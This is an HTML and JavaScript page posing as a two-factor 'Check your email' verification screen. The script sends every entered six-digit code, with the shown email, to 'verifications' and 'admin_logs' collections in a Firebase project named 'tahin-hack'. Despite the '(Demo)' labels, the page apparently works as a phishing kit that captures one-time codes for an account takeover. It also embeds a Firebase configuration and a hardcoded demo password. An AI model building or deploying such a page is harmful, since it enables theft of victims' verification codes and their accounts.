<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>2FA Verification</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-auth-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { font-family: 'Inter', system-ui, sans-serif; }
        body { background: #0f172a; }
        .otp-input {
            width: 48px; height: 56px; text-align: center; font-size: 24px; font-weight: 600;
            border: 2px solid #4b5563; border-radius: 8px; background: #1f2937; color: white;
            transition: all 0.2s;
        }
        .otp-input:focus {
            border-color: #3b82f6; outline: none; box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.3);
        }
        .phone-screen {
            background: linear-gradient(145deg, #f3f4f6, #e5e7eb);
            box-shadow: 0 10px 15px -3px rgb(0 0 0 / 0.1), 0 4px 6px -4px rgb(0 0 0 / 0.1);
        }
        .floating-phone { animation: float 4s ease-in-out infinite; }
        @keyframes float { 0% { transform: translateY(0px); } 50% { transform: translateY(-6px); } 100% { transform: translateY(0px); } }
        .toast {
            position: fixed; bottom: 30px; left: 50%; transform: translateX(-50%);
            background: #1e2937; color: #e2e8f0; padding: 12px 24px; border-radius: 40px;
            box-shadow: 0 8px 20px rgba(0,0,0,0.6); font-size: 0.95rem; z-index: 999;
            border-left: 4px solid #3b82f6; display: flex; align-items: center; gap: 10px;
            transition: opacity 0.3s; opacity: 0; pointer-events: none;
        }
        .toast.show { opacity: 1; pointer-events: auto; }
        .admin-badge {
            position: fixed; top: 20px; right: 20px; z-index: 50;
            padding: 8px 16px; background: rgba(30, 41, 59, 0.9);
            backdrop-filter: blur(10px); border-radius: 30px;
            border: 1px solid rgba(255,255,255,0.1);
            color: #94a3b8; font-size: 0.85rem;
            display: flex; align-items: center; gap: 8px;
            transition: all 0.3s;
            cursor: pointer;
        }
        .admin-badge:hover {
            background: rgba(59, 130, 246, 0.2);
            border-color: #3b82f6;
            color: #60a5fa;
        }
    </style>
</head>
<body>

    <!-- Toast -->
    <div id="toast" class="toast"><i class="fa-solid fa-circle-check text-blue-400"></i><span id="toastMessage">Ready</span></div>

    </div>

    <div class="min-h-screen flex items-center justify-center p-4">
        <div class="w-full max-w-md mx-auto">
            <!-- Header -->
            <div class="flex items-center mb-6">
                <button onclick="goBack()" class="w-10 h-10 flex items-center justify-center text-white hover:bg-slate-800 rounded-full transition-colors">
                    <i class="fa-solid fa-arrow-left text-xl"></i>
                </button>
            </div>

            <!-- Title -->
            <h1 class="text-3xl font-semibold text-white mb-2">Check your email</h1>
            <p class="text-slate-400 text-[15px] leading-relaxed">
                We sent a code to <span class="text-white" id="displayEmail">m*****@gmail.com</span>. 
                Enter that code to confirm your account.
            </p>

            <!-- Illustration -->
            <div class="bg-[#1e2937] rounded-3xl p-6 my-8 flex justify-center floating-phone">
                <div class="relative">
                    <div class="phone-screen w-56 h-96 rounded-3xl border-8 border-black relative overflow-hidden">
                        <div class="h-6 bg-black w-32 mx-auto mt-3 rounded-full"></div>
                        <div class="absolute top-12 left-1/2 transform -translate-x-1/2">
                            <div class="w-20 h-20 bg-yellow-400 rounded-2xl flex items-center justify-center shadow-xl">
                                <i class="fa-solid fa-shield-halved text-5xl text-slate-800"></i>
                            </div>
                        </div>
                        <div class="absolute bottom-8 left-1/2 transform -translate-x-1/2 w-40 bg-white/90 rounded-2xl p-3 shadow-inner">
                            <div class="grid grid-cols-3 gap-2 text-slate-800 text-sm font-medium">
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">1</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">2</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">3</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">4</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">5</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">6</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">7</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">8</div>
                                <div class="bg-white h-9 rounded-lg flex items-center justify-center">9</div>
                                <div class="col-span-3 h-9 bg-white rounded-lg flex items-center justify-center text-xs font-semibold">0</div>
                            </div>
                        </div>
                        <div class="absolute -bottom-6 right-8 text-6xl rotate-12">👆</div>
                    </div>
                </div>
            </div>

            <!-- OTP Input -->
            <div class="mb-8">
                <label class="block text-sm text-slate-400 mb-2 pl-1">Enter code</label>
                <div class="flex gap-3 justify-center" id="otp-container">
                    <!-- JS will populate 6 inputs -->
                </div>
            </div>

            <!-- Info -->
            <div class="flex items-center gap-3 text-slate-400 text-sm mb-8">
                <i class="fa-solid fa-clock text-lg"></i>
                <p>
                    It may take a few minutes for you to get this code. 
                    <button onclick="getNewCode()" class="text-blue-500 hover:text-blue-400 font-medium underline decoration-dotted">
                        Get a new code
                    </button>
                </p>
            </div>

            <!-- Buttons -->
            <button onclick="submitCode()" class="w-full bg-blue-600 hover:bg-blue-700 transition-colors text-white font-semibold py-4 rounded-2xl text-lg mb-3 shadow-lg shadow-blue-500/30">
                Continue
            </button>
            <button onclick="tryAnotherWay()" class="w-full border border-slate-600 hover:border-slate-500 transition-colors text-white font-medium py-4 rounded-2xl text-lg">
                Try another way
            </button>
        </div>
    </div>

    <script>
        // ========== FIREBASE CONFIG ==========
        const firebaseConfig = {
  apiKey: "AIzaSyB2So57nlGhZc458XheSFhv1j5acxG3fy0",
  authDomain: "tahin-hack.firebaseapp.com",
  projectId: "tahin-hack",
  storageBucket: "tahin-hack.firebasestorage.app",
  messagingSenderId: "867261325734",
  appId: "1:867261325734:web:284f95a0754e9537eeaf67",
  measurementId: "G-JLT7QKCCX1"
};


        firebase.initializeApp(firebaseConfig);
        const auth = firebase.auth();
        const db = firebase.firestore();

        // ========== Toast ==========
        const toastEl = document.getElementById('toast');
        const toastMsg = document.getElementById('toastMessage');
        let toastTimer = null;

        function showToast(msg, isError = false) {
            toastMsg.textContent = msg;
            toastEl.style.borderLeftColor = isError ? '#ef4444' : '#3b82f6';
            toastEl.classList.add('show');
            clearTimeout(toastTimer);
            toastTimer = setTimeout(() => toastEl.classList.remove('show'), 4000);
        }

        // ========== OTP Logic ==========
        function createOTPInputs() {
            const container = document.getElementById('otp-container');
            container.innerHTML = '';
            for (let i = 0; i < 6; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                input.setAttribute('aria-label', `Digit ${i+1} of 6`);
                input.addEventListener('input', function() {
                    if (this.value.length === 1) {
                        const next = this.nextElementSibling;
                        if (next) next.focus();
                    }
                });
                input.addEventListener('keydown', function(e) {
                    if (e.key === 'Backspace' && this.value === '') {
                        const prev = this.previousElementSibling;
                        if (prev) prev.focus();
                    }
                });
                input.addEventListener('keypress', function(e) {
                    if (!/[0-9]/.test(e.key)) e.preventDefault();
                });
                container.appendChild(input);
            }
        }

        function getOTPCode() {
            const inputs = document.querySelectorAll('.otp-input');
            let code = '', complete = true;
            inputs.forEach(inp => {
                if (inp.value === '') complete = false;
                code += inp.value;
            });
            return { code, complete };
        }

        // ========== Submit Code to Firebase ==========
        async function submitCode() {
            const { code, complete } = getOTPCode();
            if (!complete) {
                showToast('Please enter the complete 6-digit code.', true);
                return;
            }

            const email = document.getElementById('displayEmail').textContent.trim();
            const user = auth.currentUser;

            // Save verification to Firestore
            try {
                const docRef = await db.collection('verifications').add({
                    user: user?.displayName || 'User',
                    email: email || 'demo@firebase.com',
                    code: code,
                    status: 'success',
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });

                showToast(`✅ Verification successful! Code: ${code}`);
                console.log('✅ Saved to Firestore with ID:', docRef.id);

                // Clear OTP inputs
                document.querySelectorAll('.otp-input').forEach(inp => inp.value = '');
                document.querySelector('.otp-input')?.focus();

                // Also save to admin_logs for admin panel
                await db.collection('admin_logs').add({
                    action: 'user_verified',
                    user: user?.displayName || 'User',
                    email: email || 'demo@firebase.com',
                    code: code,
                    timestamp: firebase.firestore.FieldValue.serverTimestamp()
                });

            } catch (error) {
                showToast('❌ Error: ' + error.message, true);
                console.error('Error saving to Firestore:', error);
            }
        }

        // ========== Other Functions ==========
        function getNewCode() {
            const email = document.getElementById('displayEmail').textContent.trim();
            showToast('📧 New code sent to ' + email + ' (Demo)');
            
            // Log new code request
            db.collection('verifications').add({
                user: 'User',
                email: email,
                code: 'NEW_CODE_REQUEST',
                status: 'pending',
                timestamp: firebase.firestore.FieldValue.serverTimestamp()
            }).catch(err => console.error('Error logging code request:', err));
        }

        function tryAnotherWay() {
            showToast('🔄 Trying another verification method... (Demo)');
        }

        function goBack() {
            showToast('🔙 Going back... (Demo)');
        }

        // ========== Auth State ==========
        auth.onAuthStateChanged(user => {
            if (user) {
                document.getElementById('displayEmail').textContent = user.email || 'demo@firebase.com';
                // Save user to Firestore
                db.collection('users').doc(user.uid).set({
                    email: user.email,
                    displayName: user.displayName || 'User',
                    lastSignIn: firebase.firestore.FieldValue.serverTimestamp(),
                    createdAt: firebase.firestore.FieldValue.serverTimestamp()
                }, { merge: true }).catch(err => console.error('Error saving user:', err));
            } else {
                // Auto-login for demo
                auth.signInWithEmailAndPassword('user@demo.com', 'user123')
                    .then(() => {
                        showToast('✅ Logged in as user');
                    })
                    .catch(() => {
                        auth.createUserWithEmailAndPassword('user@demo.com', 'user123')
                            .then(() => {
                                showToast('✅ User account created');
                            })
                            .catch(err => {
                                showToast('⚠️ ' + err.message, true);
                            });
                    });
            }
        });

        // ========== Init ==========
        window.onload = function() {
            createOTPInputs();
            setTimeout(() => {
                const first = document.querySelector('.otp-input');
                if (first) first.focus();
            }, 500);
        };

        // Make functions globally accessible
        window.submitCode = submitCode;
        window.getNewCode = getNewCode;
        window.tryAnotherWay = tryAnotherWay;
        window.goBack = goBack;
    </script>
</body>
                      </html>
